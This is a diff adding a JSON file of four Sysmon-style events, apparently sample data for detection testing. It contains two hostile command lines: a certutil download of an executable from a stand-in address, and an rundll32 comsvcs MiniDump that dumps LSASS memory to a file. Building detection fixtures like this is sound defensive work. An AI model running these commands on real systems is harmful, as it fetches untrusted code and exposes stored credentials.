@@ -1,0 +1,41 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-01-15 09:14:22.117",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "IntegrityLevel": "Medium"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-01-15 09:15:03.882",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "OriginalFileName": "RUNDLL32.EXE",
+    "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 C:\\temp\\lsass.dmp full",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "IntegrityLevel": "High"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-01-15 09:16:41.005",
+    "Image": "C:\\Windows\\System32\\ipconfig.exe",
+    "OriginalFileName": "ipconfig.exe",
+    "CommandLine": "ipconfig /all",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "IntegrityLevel": "Medium"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2026-01-15 09:16:55.400",
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "SourceIp": "10.0.0.5",
+    "DestinationIp": "192.0.2.50",
+    "DestinationPort": 443,
+    "Protocol": "tcp"
+  }
+]
